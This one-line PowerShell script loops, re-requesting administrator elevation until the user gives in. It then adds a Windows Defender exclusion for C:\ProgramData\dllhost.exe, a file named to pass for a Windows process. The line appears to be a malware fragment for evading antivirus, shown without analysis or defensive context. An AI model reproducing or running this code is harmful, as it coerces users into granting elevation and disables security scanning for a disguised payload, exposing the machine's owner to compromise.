while ($true) { try { Start-Process 'powershell' -Verb runas -ArgumentList 'Add-MpPreference -ExclusionProcess C:\ProgramData\dllhost.exe'; exit } catch {} }
